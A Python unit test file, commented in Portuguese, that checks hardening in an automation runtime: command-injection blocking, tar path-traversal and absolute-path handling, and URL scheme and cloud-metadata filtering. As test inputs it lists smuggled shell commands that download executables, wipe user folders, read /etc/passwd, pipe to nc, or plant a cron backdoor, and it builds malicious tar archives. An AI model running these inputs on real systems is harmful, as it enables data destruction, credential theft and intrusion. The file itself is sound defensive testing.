"""Testes das protecoes de lancamento de aplicativos e de extracao de arquivos."""

from pathlib import Path
import io
import shutil
import sys
import tarfile
import tempfile
import unittest
import zipfile

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from runtime.file_archive_engine import FileArchiveEngine
from runtime.system_automation import SystemAutomationEngine


class LaunchApplicationHardeningTests(unittest.TestCase):
    """Valida que um comando nao pode carregar um segundo comando junto."""

    def setUp(self) -> None:
        self.engine = SystemAutomationEngine()

    def test_bloqueia_encadeamento_de_comandos(self) -> None:
        """
        A lista de comandos proibidos so reconhece o que ja foi previsto.

        Cada exemplo abaixo passa pela lista, mas usa um separador de shell para
        executar algo a mais junto do aplicativo pedido.
        """

        for comando in (
            "notepad & curl http://exemplo.invalido/x.exe -o x.exe",
            "notepad && rd /s /q C:\\Users",
            "xdg-open arquivo.txt; cat /etc/passwd",
            "app | nc 10.0.0.1 4444",
            "app > /etc/cron.d/backdoor",
            "app `whoami`",
            "app $(id)",
            "app\nsegundo-comando",
        ):
            with self.subTest(comando=comando):
                resultado = self.engine.launch_application(comando)
                self.assertEqual(resultado["status"], "bloqueado")
                self.assertIn("separador de shell", resultado["motivo"])

    def test_mantem_a_lista_de_comandos_proibidos(self) -> None:
        """A protecao anterior continua valendo."""

        self.assertEqual(self.engine.launch_application("rm -rf /")["status"], "bloqueado")

    def test_nao_bloqueia_caminho_legitimo_com_parenteses(self) -> None:
        """
        Caminhos do Windows com '(x86)' nao podem ser tratados como ataque.

        A verificacao olha apenas se o comando foi barrado. O que acontece
        depois do portao depende do sistema onde o teste roda — se existe um
        `xdg-open`, se o caminho existe — e nao e o que este teste cobre.
        """

        resultado = self.engine.launch_application("C:\\Program Files (x86)\\App\\app.exe")

        self.assertNotEqual(resultado["status"], "bloqueado")
        self.assertNotIn("separador de shell", resultado.get("motivo", ""))


class ArchiveExtractionHardeningTests(unittest.TestCase):
    """Valida que a extracao nao grava fora do diretorio de destino."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp())
        self.engine = FileArchiveEngine(archive_dir=self.tmp / "archives")

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_recusa_membro_de_tar_que_escapa_do_destino(self) -> None:
        """
        `tarfile.extractall` sem filtro honra '..' e grava fora do destino.

        Esta e a familia CVE-2007-4559: um arquivo compactado escolhe onde sera
        gravado no disco de quem o extrai.
        """

        carga = self.tmp / "carga.txt"
        carga.write_text("conteudo que nao deve escapar", encoding="utf-8")
        malicioso = self.tmp / "malicioso.tar"
        with tarfile.open(malicioso, "w") as arquivo:
            arquivo.add(carga, arcname="../fora_do_destino.txt")

        destino = self.tmp / "destino"
        resultado = self.engine.decompress_archive(archive_path=malicioso, destination_dir=destino)

        self.assertEqual(resultado["status"], "erro")
        self.assertFalse((self.tmp / "fora_do_destino.txt").exists())

    def test_recusa_membro_de_tar_com_caminho_absoluto(self) -> None:
        """
        Um membro com caminho absoluto tambem escolheria o destino.

        `TarFile.add` normaliza o `arcname` e remove a barra inicial, entao o
        membro e montado na mao para reproduzir o que um arquivo hostil traz.
        """

        dados = b"absoluto"
        # Caminho absoluto proprio do teste, para nao depender de estado em /tmp.
        alvo_absoluto = self.tmp / "alvo_absoluto.txt"
        malicioso = self.tmp / "absoluto.tar"
        with tarfile.open(malicioso, "w") as arquivo:
            info = tarfile.TarInfo(name=str(alvo_absoluto))
            info.size = len(dados)
            arquivo.addfile(info, io.BytesIO(dados))

        destino = self.tmp / "destino_absoluto"
        resultado = self.engine.decompress_archive(archive_path=malicioso, destination_dir=destino)

        # O filtro neutraliza o caminho em vez de recusar o arquivo inteiro: a
        # extracao conclui, mas o membro e gravado dentro do destino.
        self.assertEqual(resultado["status"], "sucesso")
        self.assertFalse(alvo_absoluto.exists())
        self.assertTrue((destino / alvo_absoluto.relative_to(alvo_absoluto.anchor)).exists())

    def test_extrai_tar_legitimo_normalmente(self) -> None:
        """A protecao nao pode impedir a extracao de um arquivo comum."""

        carga = self.tmp / "documento.txt"
        carga.write_text("documento valido", encoding="utf-8")
        valido = self.tmp / "valido.tar"
        with tarfile.open(valido, "w") as arquivo:
            arquivo.add(carga, arcname="documento.txt")

        destino = self.tmp / "destino_valido"
        resultado = self.engine.decompress_archive(archive_path=valido, destination_dir=destino)

        self.assertEqual(resultado["status"], "sucesso")
        self.assertEqual((destino / "documento.txt").read_text(encoding="utf-8"), "documento valido")

    def test_extrai_zip_legitimo_normalmente(self) -> None:
        """O caminho zip continua funcionando."""

        valido = self.tmp / "valido.zip"
        with zipfile.ZipFile(valido, "w") as arquivo:
            arquivo.writestr("documento.txt", "documento zip valido")

        destino = self.tmp / "destino_zip"
        resultado = self.engine.decompress_archive(archive_path=valido, destination_dir=destino)

        self.assertEqual(resultado["status"], "sucesso")
        self.assertEqual((destino / "documento.txt").read_text(encoding="utf-8"), "documento zip valido")


if __name__ == "__main__":
    unittest.main()


class WebFetchSchemeTests(unittest.TestCase):
    """Valida que o motor web so busca enderecos HTTP."""

    def setUp(self) -> None:
        from runtime.web_browser_engine import WebBrowserEngine

        self.engine = WebBrowserEngine()

    def test_recusa_esquemas_que_nao_sao_web(self) -> None:
        """
        `urlopen` atende `file://` e `ftp://`, nao apenas web.

        Sem a restricao, pedir uma "pagina" bastaria para ler um arquivo do
        disco do hospedeiro.
        """

        for endereco in ("file:///etc/passwd", "ftp://exemplo.invalido/x", "gopher://exemplo.invalido"):
            with self.subTest(endereco=endereco):
                resultado = self.engine.fetch_page_content(endereco)
                self.assertEqual(resultado["status"], "bloqueado")

    def test_recusa_endereco_de_metadados_de_nuvem(self) -> None:
        """O endereco de metadados entrega credenciais da instancia sem autenticacao."""

        resultado = self.engine.fetch_page_content("http://169.254.169.254/latest/meta-data/")
        self.assertEqual(resultado["status"], "bloqueado")

    def test_aceita_endereco_http_comum(self) -> None:
        """Um endereco web legitimo nao pode ser barrado pela validacao."""

        from runtime.web_browser_engine import validate_fetchable_url

        self.assertIsNone(validate_fetchable_url("https://exemplo.org/pagina"))
        self.assertIsNone(validate_fetchable_url("http://exemplo.org:8080/a/b?c=d"))
